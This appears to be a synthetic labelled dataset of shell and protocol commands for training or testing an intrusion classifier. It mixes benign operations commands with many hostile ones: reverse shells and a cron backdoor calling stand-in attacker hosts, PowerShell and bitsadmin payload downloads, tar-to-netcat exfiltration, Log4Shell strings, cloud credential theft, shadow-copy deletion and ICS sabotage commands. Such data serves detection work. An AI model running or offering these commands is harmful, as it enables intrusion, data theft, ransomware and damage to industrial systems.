timestamp,src_ip,input,label
2026-01-20T18:06:49.641230,44.171.73.131,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.631464,202.244.111.72,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.586561,158.112.43.93,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.592928,221.61.98.181,curl https://google.com,Normal_Business_Ops
2026-01-20T18:06:49.606716,94.237.40.177,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.583995,133.236.201.183,git status,Normal_Business_Ops
2026-01-20T18:06:49.649821,199.191.180.213,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.617074,152.8.72.31,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.597537,216.213.105.146,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T18:06:49.644231,63.237.53.78,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.638465,57.72.116.48,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.580995,77.184.136.155,git checkout -b feature-ai,Normal_Business_Ops
2026-01-20T18:06:49.592928,101.211.208.111,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.592928,222.31.150.110,uptime,Normal_Business_Ops
2026-01-20T18:06:49.610343,200.200.153.191,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.581995,158.184.15.114,make build,Normal_Business_Ops
2026-01-20T18:06:49.610343,48.255.80.53,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.588562,29.183.135.73,git log -n 5,Normal_Business_Ops
2026-01-20T18:06:49.656632,73.62.71.127,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.627851,124.195.12.223,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.657633,88.221.108.64,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.629483,41.222.145.24,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.600538,181.223.99.122,git branch,Normal_Business_Ops
2026-01-20T18:06:49.580995,5.173.13.195,ps -ef | grep python,Normal_Business_Ops
2026-01-20T18:06:49.578927,99.103.116.146,npm start,Normal_Business_Ops
2026-01-20T18:06:49.622713,3.70.196.138,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.580022,101.138.79.86,go run main.go,Normal_Business_Ops
2026-01-20T18:06:49.581995,13.4.101.182,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.578927,59.237.203.9,npm start,Normal_Business_Ops
2026-01-20T18:06:49.612343,166.30.199.205,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.603716,63.183.238.156,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.597537,161.254.82.133,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.611343,178.124.51.111,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.576929,21.3.208.108,systemctl status docker,Normal_Business_Ops
2026-01-20T18:06:49.634463,146.184.112.116,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.577927,49.194.49.93,systemctl status docker,Normal_Business_Ops
2026-01-20T18:06:49.595541,182.79.77.208,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.635464,78.45.234.85,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.638465,169.209.35.198,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.609343,152.8.246.207,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.585564,127.137.129.171,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T18:06:49.582995,73.149.200.88,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T18:06:49.625345,3.119.113.173,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.575395,33.183.201.162,df -h,Normal_Business_Ops
2026-01-20T18:06:49.627851,101.0.175.111,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.645231,28.186.32.221,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.580995,33.163.199.30,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T18:06:49.627851,72.35.133.75,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.583995,129.149.39.196,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T18:06:49.637464,143.84.67.223,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.619742,166.137.176.211,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.595541,97.163.68.161,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T18:06:49.652043,27.11.84.245,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.631464,67.232.133.145,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T18:06:49.618055,216.25.228.3,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.605716,159.175.148.249,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.597537,170.137.201.140,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T18:06:49.615344,182.231.146.63,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.655127,174.27.176.16,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.580995,130.186.129.177,git status,Normal_Business_Ops
2026-01-20T18:06:49.619742,176.236.137.20,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.581995,47.24.148.166,npm start,Normal_Business_Ops
2026-01-20T18:06:49.618055,175.174.201.246,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.626851,195.64.176.184,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T18:06:49.633463,56.139.199.63,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.578927,22.136.7.167,docker-compose up -d,Normal_Business_Ops
2026-01-20T18:06:49.587562,171.55.51.21,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T18:06:49.580022,143.163.56.110,df -h,Normal_Business_Ops
2026-01-20T18:06:49.587562,212.161.109.29,whoami,Normal_Business_Ops
2026-01-20T18:06:49.612343,121.119.97.92,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.646819,70.84.143.162,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.622713,18.215.158.124,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.615344,109.17.168.145,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.605716,204.251.120.224,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T18:06:49.599537,48.15.178.132,make build,Normal_Business_Ops
2026-01-20T18:06:49.647820,186.125.107.165,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.646819,193.105.79.68,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.624776,216.156.195.234,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.644231,60.125.187.52,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.654619,210.225.208.120,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T18:06:49.633463,156.186.125.13,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T18:06:49.632463,171.67.11.217,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.575395,66.7.229.242,npm start,Normal_Business_Ops
2026-01-20T18:06:49.602715,214.46.231.36,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.610343,78.66.36.167,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.595541,180.68.249.100,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T18:06:49.581995,87.6.169.115,git branch,Normal_Business_Ops
2026-01-20T18:06:49.647820,57.174.237.200,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.645823,127.190.155.24,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.614343,151.68.79.32,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.635464,87.83.85.197,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.610343,106.226.233.252,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.590224,82.50.157.244,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.589562,27.193.48.227,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T18:06:49.623750,63.219.98.165,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.653031,69.78.123.252,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.653031,204.66.145.230,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.629483,170.166.168.211,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T18:06:49.629483,88.242.58.141,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.603716,84.174.119.188,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.588562,183.172.200.17,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T18:06:49.651526,34.103.118.80,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.609343,126.255.57.79,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.618055,210.72.170.196,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.647820,160.2.55.180,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.595541,10.65.9.106,history | tail -n 20,Normal_Business_Ops
2026-01-20T18:06:49.581995,105.126.51.152,uptime,Normal_Business_Ops
2026-01-20T18:06:49.632463,190.156.240.63,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.635464,52.28.184.29,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.634463,99.32.14.218,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T18:06:49.618055,144.211.131.17,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.579998,132.249.118.182,git checkout -b feature-ai,Normal_Business_Ops
2026-01-20T18:06:49.591206,41.89.89.243,git remote -v,Normal_Business_Ops
2026-01-20T18:06:49.613343,82.159.101.184,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.631464,121.168.94.71,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.654619,154.159.94.138,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.627851,21.68.78.41,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.613343,219.56.15.91,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.639217,77.83.111.150,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T18:06:49.576929,25.92.170.174,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.577927,59.211.238.44,"git commit -m ""Initial UI""",Normal_Business_Ops
2026-01-20T18:06:49.656632,198.205.98.22,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.588562,201.72.18.184,history | tail -n 20,Normal_Business_Ops
2026-01-20T18:06:49.653031,181.211.251.174,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.593923,117.2.240.83,whoami,Normal_Business_Ops
2026-01-20T18:06:49.614343,118.134.26.112,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.592928,84.118.195.139,git remote -v,Normal_Business_Ops
2026-01-20T18:06:49.628852,159.177.28.53,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.609343,3.115.114.161,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T18:06:49.598537,39.35.202.112,df -h,Normal_Business_Ops
2026-01-20T18:06:49.628852,145.47.138.178,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.617074,119.176.175.150,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.618055,152.168.252.126,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.609343,38.95.77.53,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T18:06:49.590224,127.130.187.42,git fetch origin main,Normal_Business_Ops
2026-01-20T18:06:49.580995,90.142.155.218,df -h,Normal_Business_Ops
2026-01-20T18:06:49.633463,197.242.84.148,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.625855,30.56.197.33,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.623750,56.198.196.135,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.649821,203.132.241.103,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.653031,132.219.149.45,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.610343,60.225.113.137,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.617074,194.124.147.135,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.647820,161.218.235.102,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.613343,1.129.195.111,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.617074,29.148.130.48,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.598537,149.206.78.33,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T18:06:49.656632,24.27.245.85,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.618055,77.113.167.243,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.655635,194.243.146.38,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T18:06:49.585564,83.197.43.239,docker-compose up -d,Normal_Business_Ops
2026-01-20T18:06:49.655127,88.5.252.238,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T18:06:49.618055,178.12.37.230,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.596536,68.209.125.239,git status,Normal_Business_Ops
2026-01-20T18:06:49.630463,138.14.159.127,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.593923,122.199.23.44,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T18:06:49.615344,83.21.201.203,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.656632,200.98.44.52,cipher /w:C:\,Ransomware_Prep
2026-01-20T18:06:49.594923,134.121.26.209,"git commit -m ""update dashboard""",Normal_Business_Ops
2026-01-20T18:06:49.630463,6.5.2.143,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T18:06:49.595541,100.5.144.224,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T18:06:49.626851,181.177.103.36,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.601728,156.35.57.253,git merge main,Normal_Business_Ops
2026-01-20T18:06:49.587562,134.158.32.204,docker-compose up -d,Normal_Business_Ops
2026-01-20T18:06:49.596536,145.240.224.158,git branch,Normal_Business_Ops
2026-01-20T18:06:49.638465,106.32.93.42,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T18:06:49.653031,142.133.61.251,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T18:06:49.606716,133.254.72.187,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T18:06:49.616344,182.213.77.254,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.578927,19.234.118.77,git push origin main,Normal_Business_Ops
2026-01-20T18:06:49.625855,108.14.5.144,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T18:06:49.619742,127.235.82.193,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T18:06:49.625345,60.157.75.191,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T18:06:49.646819,37.135.190.156,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T18:06:49.613343,130.217.198.159,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T18:06:49.589562,42.117.75.219,git branch,Normal_Business_Ops
2026-01-20T18:06:49.638465,144.242.131.97,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.642230,144.75.177.14,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T18:06:49.609343,93.91.83.84,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T18:06:49.633463,144.148.27.35,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T18:06:49.585564,145.131.196.161,git remote -v,Normal_Business_Ops
